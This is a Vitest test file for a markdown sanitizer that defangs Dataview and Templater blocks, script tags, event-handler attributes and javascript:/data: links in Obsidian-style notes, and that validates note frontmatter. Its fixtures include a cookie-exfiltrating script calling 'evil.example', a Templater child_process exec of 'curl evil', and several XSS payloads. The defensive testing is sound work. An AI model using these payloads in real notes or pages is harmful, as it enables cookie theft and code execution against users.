import { describe, expect, it } from "vitest";

import {
  normalizeFrontmatter,
  sanitizeAndNormalize,
  sanitizeMarkdown,
} from "./enrichSanitize";

// A minimal, valid, prompt-shaped idea note used as a carrier for body-level
// sanitize assertions. Its frontmatter is canonical so sanitizeAndNormalize
// round-trips the frontmatter byte-for-byte and we can focus on the body.
function ideaNote(body: string): string {
  return `---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea, seedling]\n---\n${body}`;
}

// ── Sanitize: neutralize executable content ───────────────────────────────────

describe("sanitizeMarkdown — executable fences", () => {
  it("(1) renames an injected ```dataviewjs block to ```text, preserving the body", () => {
    const input = ideaNote(
      "# Title\n\n```dataviewjs\ndv.pages().file.tasks\n```\n",
    );
    const out = sanitizeMarkdown(input);
    expect(out).toContain("```text\ndv.pages().file.tasks\n```");
    expect(out).not.toContain("```dataviewjs");
    // block body is preserved verbatim
    expect(out).toContain("dv.pages().file.tasks");
  });

  it("(3) renames an inline ```dataview DQL block to ```text", () => {
    const input = ideaNote(
      "# Title\n\n```dataview\nLIST FROM #idea\n```\n",
    );
    const out = sanitizeMarkdown(input);
    expect(out).toContain("```text\nLIST FROM #idea\n```");
    expect(out).not.toContain("```dataview\n");
    expect(out).toContain("LIST FROM #idea");
  });

  it("(3b) neutralizes an inline Dataview `=…` query span", () => {
    const input = ideaNote("# Title\n\nToday: `= this.file.name` here.\n");
    const out = sanitizeMarkdown(input);
    expect(out).not.toContain("`= this.file.name`");
    expect(out).toContain("`inert: = this.file.name`");
  });

  it("(1t) renames a ```dataviewjs fence AND neutralizes Templater hidden in its body", () => {
    const input = ideaNote(
      "# Title\n\n```dataviewjs\n<%* const {exec}=require('child_process'); exec('curl evil') %>\n```\n",
    );
    const out = sanitizeMarkdown(input);
    // fence language is defanged
    expect(out).toContain("```text");
    expect(out).not.toContain("```dataviewjs");
    // AND the Templater expression inside the fence is gone (not passed through)
    expect(out).not.toContain("<%");
    expect(out).not.toContain("require('child_process')");
    expect(out).toContain("[templater expression removed]");
  });

  it("(2t) preserves a legitimate ```js fence language but STILL neutralizes Templater inside it", () => {
    const input = ideaNote(
      "# Title\n\n```js\nconst x = 1; // <%= tp.file.title %>\n```\n",
    );
    const out = sanitizeMarkdown(input);
    // ```js is not a dangerous fence type — the language survives
    expect(out).toContain("```js");
    // but Templater is caught even inside an otherwise-"safe" fence
    expect(out).not.toContain("<%");
    expect(out).not.toContain("tp.file.title");
    expect(out).toContain("[templater expression removed]");
    // the surrounding legitimate JS is preserved
    expect(out).toContain("const x = 1;");
  });
});

describe("sanitizeMarkdown — templater / html / links", () => {
  it("(2) neutralizes a Templater `<%=…%>` expression", () => {
    const input = ideaNote("# Title\n\nDate: <%= tp.date.now() %>\n");
    const out = sanitizeMarkdown(input);
    expect(out).not.toContain("<%");
    expect(out).not.toContain("tp.date.now");
    expect(out).toContain("[templater expression removed]");
  });

  it("(4) strips a raw <script> tag and its body", () => {
    const input = ideaNote(
      "# Title\n\n<script>fetch('https://evil.example/'+document.cookie)</script>\n",
    );
    const out = sanitizeMarkdown(input);
    expect(out).not.toContain("<script");
    expect(out).not.toContain("document.cookie");
    expect(out).toContain("[script removed]");
  });

  it("(4b) neutralizes an on*= event-handler attribute", () => {
    const input = ideaNote(`# Title\n\n<img src="x" onerror="alert(1)">\n`);
    const out = sanitizeMarkdown(input);
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("alert(1)");
  });

  it("(4c) neutralizes an on*= handler with a `/` (no-space) tag delimiter — <svg/onload>", () => {
    const input = ideaNote("# Title\n\n<svg/onload=alert(1)>\n");
    const out = sanitizeMarkdown(input);
    expect(out).not.toContain("onload");
    expect(out).not.toContain("alert(1)");
  });

  it("(4d) neutralizes an on*= handler with a `/` delimiter mid-tag — <img/onerror=x src=y>", () => {
    const input = ideaNote("# Title\n\n<img/onerror=x src=y>\n");
    const out = sanitizeMarkdown(input);
    expect(out).not.toContain("onerror");
  });

  it("(5) neutralizes a javascript: markdown link target", () => {
    const input = ideaNote("# Title\n\n[click](javascript:alert(1))\n");
    const out = sanitizeMarkdown(input);
    expect(out).not.toContain("javascript:");
    // link text is preserved; only the scheme is defanged
    expect(out).toContain("[click](#");
  });

  it("(5b) neutralizes a data: target in a NON-image markdown link", () => {
    const input = ideaNote(
      "# Title\n\n[dl](data:text/html;base64,PHNjcmlwdD4=)\n",
    );
    const out = sanitizeMarkdown(input);
    expect(out).not.toContain("[dl](data:");
    expect(out).toContain("[dl](#");
  });

  it("(5c) neutralizes a NON-image data: URI disguised as an image with a leading `!`", () => {
    const input = ideaNote(
      "# Title\n\n![text](data:text/html;base64,PHNjcmlwdD4=)\n",
    );
    const out = sanitizeMarkdown(input);
    // the mime is not `image/`, so the image exception must NOT apply — the
    // data: scheme is defanged rather than passed through as a "safe image"
    expect(out).not.toContain("data:text/html");
    expect(out).toContain("](#text/html;base64,PHNjcmlwdD4=)");
  });
});

// ── False-positive guards: legitimate captured content must survive ───────────

describe("sanitizeMarkdown — false-positive guards", () => {
  it("leaves an ## Actions checkbox section byte-for-byte untouched", () => {
    // The idea/journal prompts emit action items as GFM task checkboxes
    // (2026-07-17); the sanitizer must never mangle them or Obsidian stops
    // treating them as tasks.
    const section = [
      "# Note",
      "",
      "## Actions",
      "- [ ] email Sam about the venue",
      "- [x] book the flight",
      "- [ ] follow up on [[Ada Lovelace]]",
    ].join("\n");
    expect(sanitizeMarkdown(section)).toBe(section);
  });

  it("(6) leaves a legitimate ```js code snippet byte-for-byte untouched", () => {
    const snippet = [
      "```js",
      "const el = document.querySelector('#app');",
      "el.innerHTML = '<script>noop</script>';",
      "onClick = () => run();",
      "```",
    ].join("\n");
    // no frontmatter — isolate the fence behavior from normalization
    expect(sanitizeMarkdown(snippet)).toBe(snippet);
  });

  it("(7) leaves a legitimate ```html code snippet byte-for-byte untouched", () => {
    const snippet = [
      "```html",
      "<script>alert('this is documentation, not execution')</script>",
      '<a href="javascript:void(0)">x</a>',
      "```",
    ].join("\n");
    expect(sanitizeMarkdown(snippet)).toBe(snippet);
  });

  it("(8) does NOT strip the data: src of an inline image (#60 regression)", () => {
    const src =
      "![image](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVR4nGMAAAAEAAH2FzhVAAAAAElFTkSuQmCC)";
    const input = ideaNote(`# Title\n\n${src}\n`);
    const out = sanitizeMarkdown(input);
    expect(out).toContain(src);
    expect(out).toContain("data:image/png;base64,");
  });

  it("(12) leaves verified-sound patterns (wikilinks, location, journal headers) intact", () => {
    const body = [
      "# Summary",
      "",
      "location: 48.8566,2.3522",
      "People: [[Ada Lovelace]] and [[Alan Turing]]",
      "",
      "## 09:30",
      "- did a thing",
      "",
      "---",
      "",
      "## 14:00",
      "- did another thing",
    ].join("\n");
    const input = ideaNote(`${body}\n`);
    const out = sanitizeMarkdown(input);
    expect(out).toContain("location: 48.8566,2.3522");
    expect(out).toContain("[[Ada Lovelace]] and [[Alan Turing]]");
    expect(out).toContain("## 09:30");
    expect(out).toContain("## 14:00");
    // sanitize is a no-op on this benign body
    expect(sanitizeMarkdown(body)).toBe(body);
  });
});

// ── Normalize frontmatter ─────────────────────────────────────────────────────

describe("normalizeFrontmatter", () => {
  it("(9) round-trips a valid idea note byte-for-byte", () => {
    const md =
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea, seedling, ai]\n---\n# My Idea\n\nExpanded thought.\n";
    expect(normalizeFrontmatter(md, "idea")).toBe(md);
  });

  it("(10) round-trips a valid journal note byte-for-byte", () => {
    const md =
      "---\ndate: 2026-07-04\ntags: [journal, work]\npeople: [[[Ada]]]\nideas: []\n---\n# Busy day\n\n## Notes\n- shipped B3\n";
    expect(normalizeFrontmatter(md, "journal")).toBe(md);
  });

  it("re-serializes idea frontmatter into canonical order", () => {
    const md =
      "---\ntags: [idea]\nstatus: seedling\ncreated: 2026-07-04\n---\n# T\n\nbody\n";
    expect(normalizeFrontmatter(md, "idea")).toBe(
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\n---\n# T\n\nbody\n",
    );
  });

  it("appends unknown extra keys after the canonical ones", () => {
    const md =
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\nsource: web\n---\n# T\n";
    const out = normalizeFrontmatter(md, "idea");
    expect(out).toBe(
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\nsource: web\n---\n# T\n",
    );
  });

  it("(11) returns null when a required key is missing", () => {
    // idea note missing `status` and `tags`
    const md = "---\ncreated: 2026-07-04\n---\n# T\n\nbody\n";
    expect(normalizeFrontmatter(md, "idea")).toBeNull();
  });

  it("(11b) returns null when there is no frontmatter block at all", () => {
    expect(normalizeFrontmatter("# Just a title\n\nbody\n", "idea")).toBeNull();
  });

  it("(11c) returns null when the frontmatter block is empty", () => {
    expect(normalizeFrontmatter("---\n---\n# T\n", "shared")).toBeNull();
  });

  it("validates the journal required set (missing people → null)", () => {
    const md = "---\ndate: 2026-07-04\ntags: [journal]\n---\n# T\n";
    expect(normalizeFrontmatter(md, "journal")).toBeNull();
  });

  it("accepts a shared note that carries only its required `kind`", () => {
    const md = "---\ncreated: 2026-07-04\nkind: shared-link\ntags: [shared]\n---\n# T\n";
    expect(normalizeFrontmatter(md, "shared")).toBe(md);
  });
});

// ── Combined entry point ──────────────────────────────────────────────────────

describe("sanitizeAndNormalize", () => {
  it("neutralizes body threats AND canonicalizes frontmatter in one pass", () => {
    const md =
      "---\ntags: [idea]\nstatus: seedling\ncreated: 2026-07-04\n---\n# T\n\n```dataviewjs\ndv.pages()\n```\n";
    const out = sanitizeAndNormalize(md, "idea");
    expect(out).not.toBeNull();
    expect(out).toContain("---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\n---");
    expect(out).toContain("```text\ndv.pages()\n```");
    expect(out).not.toContain("```dataviewjs");
  });

  it("returns null when the sanitized note has malformed frontmatter", () => {
    // sanitize runs, but the frontmatter is missing required idea keys
    const md = "---\ncreated: 2026-07-04\n---\n# T\n\n<script>x</script>\n";
    expect(sanitizeAndNormalize(md, "idea")).toBeNull();
  });
});
